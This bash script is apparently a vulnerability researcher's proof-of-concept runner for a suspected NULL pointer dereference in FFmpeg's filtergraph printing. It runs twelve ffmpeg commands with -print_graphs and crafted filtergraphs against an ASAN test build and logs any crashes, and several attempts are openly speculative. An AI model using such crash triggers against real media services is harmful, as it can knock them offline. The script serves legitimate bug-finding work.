#!/bin/bash
# PoC runner for VULN 001 - NULL Pointer Dereference in print_filter()
# via unlinked filter pad (CWE-476) in graphprint.c lines 411-413, 443-446.
#
# Root cause: print_filter() at lines 411/443 does:
#   AVFilterLink *link = filter->inputs[i];  (or outputs[i])
#   sec_ctx.context_type = av_get_media_type_string(link->type);  <- no NULL check
#
# For link to be NULL we need a filter that has nb_inputs/nb_outputs > 0
# but some pad not yet wired up.  This can happen when:
#  a) avfilter_graph_config fails AFTER avfilter_graph_alloc but BEFORE all
#     pads are linked, and -print_graphs is enabled at exit.
#  b) A filter with optional/dynamic pads is printed before full configuration.
#
# Strategy: pair -print_graphs with filtergraphs that fail mid-configuration
# so that fgt.graph is non-NULL but some link is NULL.

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT=vuln_001_result.txt

echo "[*] Generating input file..."
python3 vuln_001_gen.py

: > "$RESULT"
echo "=== VULN 001 PoC: NULL dereference in print_filter() ===" >> "$RESULT"
echo "Binary: $BIN" >> "$RESULT"
echo "Date: $(date)" >> "$RESULT"
echo "" >> "$RESULT"

# run_attempt <label> [ffmpeg args...]
run_attempt() {
    local label="$1"; shift
    echo "--- Attempt: $label ---" >> "$RESULT"
    printf 'CMD: %s' "$BIN" >> "$RESULT"
    printf ' %s' "$@" >> "$RESULT"
    echo >> "$RESULT"
    ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001.log" \
        "$BIN" "$@" >> "$RESULT" 2>&1
    local rc=$?
    echo "EXIT CODE: $rc" >> "$RESULT"
    for f in asan_001.log.*; do
        [ -f "$f" ] && { cat "$f" >> "$RESULT"; rm -f "$f"; }
    done
    echo "" >> "$RESULT"
}

# -----------------------------------------------------------------------
# Attempt 1: split with both outputs connected (baseline: no crash expected)
# -----------------------------------------------------------------------
run_attempt "baseline-split-both-connected" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]split=2[a][b];[a]scale=8:8[o1];[b]scale=16:16[o2]" \
    -map "[o1]" -map "[o2]" -f null -

# -----------------------------------------------------------------------
# Attempt 2: select filter with dynamic outputs, only one output mapped.
# 'select' has AVFILTER_FLAG_DYNAMIC_OUTPUTS. With n=2, it creates 2 pads.
# If only [sel0] is a filtergraph output, [sel1] is never connected → NULL
# link in select->outputs[1] when print_filter is called on a partial graph.
# -----------------------------------------------------------------------
run_attempt "select-dynamic-outputs-partial" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]select='gte(n,0)':n=2[sel0][sel1];[sel0]scale=8:8[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 3: select filter with n=2 but only one label in the complex string.
# The second output is unlabeled → left as an open output NOT connected to
# any downstream filter → avfilter_graph_config should fail, but is fgt.graph
# still non-NULL at that point?
# -----------------------------------------------------------------------
run_attempt "select-n2-one-label-open-out" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]select='gte(n,0)':n=2[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 4: attempt with bm3d filter (DYNAMIC_INPUTS).
# bm3d takes a main input and an optional reference input.
# Use only 1 input (no reference) → reference pad may stay unlinked.
# -----------------------------------------------------------------------
run_attempt "bm3d-single-input-dynamic" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]bm3d=sigma=3[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 5: overlay filter with only 1 input (missing second input).
# overlay requires 2 inputs but here only 1 is connected.
# avfilter_graph_config should fail, testing if graph is still printed.
# -----------------------------------------------------------------------
run_attempt "overlay-one-input-missing" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]overlay[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 6: scale → nullsink to force 0-output state on scale.
# This tests NULL dereference in outputs loop.
# -----------------------------------------------------------------------
run_attempt "scale-nullsink-outputs" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]scale=8:8[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 7: Force filtergraph parsing to fail partway via invalid pad label.
# Use an unclosed bracket or unknown filter to trigger mid-parse failure.
# -----------------------------------------------------------------------
run_attempt "invalid-filter-mid-parse" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]split=2[a][b];[a]INVALID_FILTER_XXXXXXX[out]" \
    -map "[out]" -f null -

# -----------------------------------------------------------------------
# Attempt 8: Use movie source with DYNAMIC_OUTPUTS requesting more streams
# than the file provides, leaving some output pads potentially NULL.
# -----------------------------------------------------------------------
run_attempt "movie-dynamic-outputs-missing-stream" \
    -y -print_graphs \
    -filter_complex "movie=vuln_001_input.avi:s=dv+da[v][a]" \
    -map "[v]" -f null -

# -----------------------------------------------------------------------
# Attempt 9: ebur128 with video output enabled.
# ebur128 has DYNAMIC_OUTPUTS (audio + optional video output).
# Using an audio file is needed; try by wrapping the silent video.
# -----------------------------------------------------------------------
run_attempt "ebur128-video-output-dynamic" \
    -y -print_graphs \
    -f lavfi -i "aevalsrc=0:d=1:s=44100:c=stereo" \
    -filter_complex "[0:a]ebur128=video=1[audio][video]" \
    -map "[audio]" -f null -

# -----------------------------------------------------------------------
# Attempt 10: filtergraph reconfiguration attempt.
# Send two frames of different resolutions forcing filtergraph reinit.
# During reinit, the old graph is freed but new graph is being set up;
# if print happens in this window, links may be NULL.
# Use stream_loop with -vf scale that triggers format change.
# -----------------------------------------------------------------------
run_attempt "format-change-reinit" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -vf "scale=iw*2:ih*2,null" -f null -

# -----------------------------------------------------------------------
# Attempt 11: Use -filter_complex with an unresolved link label (open output).
# avfilter_graph_parse_ptr may partially create the graph; if fgt->graph
# is non-NULL when printing despite the error, crash may occur.
# -----------------------------------------------------------------------
run_attempt "open-output-label-unresolved" \
    -y -print_graphs \
    -i vuln_001_input.avi \
    -filter_complex "[0:v]scale=8:8" \
    -f null -

# -----------------------------------------------------------------------
# Attempt 12: lavfi nullsrc → split with one output not chained anywhere.
# Trying with -vsync drop to allow partial graph operation.
# -----------------------------------------------------------------------
run_attempt "lavfi-split-partial-map" \
    -y -print_graphs \
    -f lavfi -i "color=c=black:s=16x16:r=1:d=1" \
    -filter_complex "[0:v]split=2[a][b];[a]null[out]" \
    -map "[out]" -vsync drop -f null -

echo "[*] Done. Results in $RESULT"
